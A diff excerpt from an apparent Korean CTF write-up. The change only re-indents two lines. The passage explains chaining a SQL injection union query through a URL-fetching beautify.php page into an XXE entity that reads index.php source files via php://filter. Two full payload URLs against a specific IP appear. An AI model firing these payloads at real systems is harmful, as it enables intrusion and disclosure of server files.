@@ -95,9 +95,9 @@ http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/m
 - 바로 /proc/self/cwd 를 이용하면 된다ㅋㅋㅋㅋㅋ
 - file:///proc/self/cwd/index.php를 XXE로 읽어오려고 하면 어떤 이유에선지 되지 않는다.
 - 하지만, php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php로 읽어올 수 있는 것을 확인했다.
-http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php%22%20%3E]%3E%3C!--
+	http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php%22%20%3E]%3E%3C!--
 - 그리고 웹 디렉토리 최상위 경로에 있는 index.php도 볼 수 있다. 
-http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/../index.php%22%20%3E]%3E%3C!--
+	http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/../index.php%22%20%3E]%3E%3C!--
 이렇게
 - 그리고 자신이 알고 있는 다른 취약점을 찾아서 exploit 해보면 된다. 
 ~~근데 나는 모르겠다~~
